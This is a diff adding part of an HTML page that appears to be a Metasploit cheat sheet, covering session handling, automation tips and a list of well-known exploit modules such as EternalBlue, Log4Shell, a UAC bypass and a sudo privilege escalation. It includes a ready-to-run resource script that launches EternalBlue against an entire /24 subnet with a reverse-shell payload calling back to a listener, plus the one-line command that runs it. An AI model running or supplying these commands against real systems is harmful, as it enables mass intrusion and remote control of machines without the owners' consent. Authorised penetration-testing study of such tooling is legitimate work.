+    <div class="cmd-row single"><div class="cmd"><code>use post/windows/manage/migrate</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set AutoRunScript post/windows/manage/migrate</code> — auto-migrate on exploit</div></div>
+  </div>
+</div>
+
+<div id="tips" class="section">
+  <div class="card">
+    <div class="card-title"><i class="ti ti-sparkles" aria-hidden="true"></i> Power User Tricks</div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>use -r <span class="arg">exploit/windows/smb/ms17_010_eternalblue</span></code> — reload module live</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>grep <span class="arg">445</span> services</code> — grep MSF output</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>vulns -p <span class="arg">445</span></code> — filter vulns by port</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>sessions -u <span class="arg">&lt;id&gt;</span></code> — upgrade shell → meterpreter</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>sessions -C <span class="arg">"sysinfo"</span></code> — run command across ALL sessions</div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>for session_id in $(msfconsole -q -x "sessions -l" ...)</code> — automate via bash</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>set VERBOSE true</code> — debug mode</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>setg TimestampOutput true</code> — timestamp all output</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>load sounds</code> — audio cues on events 🔊</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-file-code" aria-hidden="true"></i> Resource Script Automation</div>
+    <div class="cmd-row single highlight"><div class="cmd" style="white-space:pre;line-height:1.8">
+<code># auto_exploit.rc
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <span class="arg">10.0.0.0/24</span>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <span class="arg">192.168.1.100</span>
+set LPORT 4444
+run -j</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>msfconsole -r auto_exploit.rc</code></div></div>
+  </div>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-check" aria-hidden="true"></i> Exploit Ranks</div>
+      <div class="cmd-row single"><div class="cmd"><code style="color:#3fb950">Excellent</code> — never crashes</div></div>
+      <div class="cmd-row single"><div class="cmd"><code style="color:#79c0ff">Great</code> — rarely crashes</div></div>
+      <div class="cmd-row single"><div class="cmd"><code style="color:#d29922">Good</code> — some risk</div></div>
+      <div class="cmd-row single"><div class="cmd"><code style="color:#ffa657">Normal</code> — may crash</div></div>
+      <div class="cmd-row single"><div class="cmd"><code style="color:#f85149">Low/Manual</code> — likely crash</div></div>
+    </div>
+    <div class="card">
+      <div class="card-title"><i class="ti ti-terminal-2" aria-hidden="true"></i> Tab & History</div>
+      <div class="cmd-row single"><div class="cmd"><code>Tab</code> — autocomplete commands</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>↑ / ↓</code> — command history</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>history</code> — view command history</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>Ctrl+Z</code> — background session</div></div>
+      <div class="cmd-row single"><div class="cmd"><code>Ctrl+C</code> — abort running module</div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title"><i class="ti ti-shield-check" aria-hidden="true"></i> Essential Exploit Cheatlist</div>
+    <div class="cmd-row single danger"><div class="cmd"><code>exploit/windows/smb/ms17_010_eternalblue</code> <span class="tag r">CVE-2017-0144</span></div></div>
+    <div class="cmd-row single danger"><div class="cmd"><code>exploit/windows/smb/ms08_067_netapi</code> <span class="tag r">XP/2003</span></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>exploit/multi/handler</code> — universal listener</div></div>
+    <div class="cmd-row single"><div class="cmd"><code>exploit/unix/ftp/vsftpd_234_backdoor</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>exploit/multi/http/apache_log4shell</code> <span class="tag r">Log4Shell</span></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>exploit/windows/local/bypassuac_eventvwr</code></div></div>
+    <div class="cmd-row single"><div class="cmd"><code>exploit/linux/local/sudo_baron_samedit</code> <span class="tag r">CVE-2021-3156</span></div></div>
+    <div class="cmd-row single highlight"><div class="cmd"><code>exploit/multi/script/web_delivery</code> — fileless delivery</div></div>
+  </div>
+</div>
+
+</div>
+<script>
+function show(id){
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  event.target.classList.add('active');
+}
+</script>
